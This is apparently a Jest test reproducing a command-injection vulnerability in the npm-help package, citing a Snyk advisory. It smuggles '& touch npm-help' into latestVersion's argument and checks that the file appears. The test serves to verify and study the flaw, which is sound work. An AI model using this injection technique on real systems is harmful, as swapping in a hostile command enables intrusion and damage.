//https://snyk.io/vuln/SNYK-JS-NPMHELP-1050983
test("Command Injection in npm-help", () => 
{
    const root = require("npm-help");
	const fs = require('fs')
	const path = './npm-help'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    var module = "& touch npm-help";
    root.latestVersion(module);
    	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
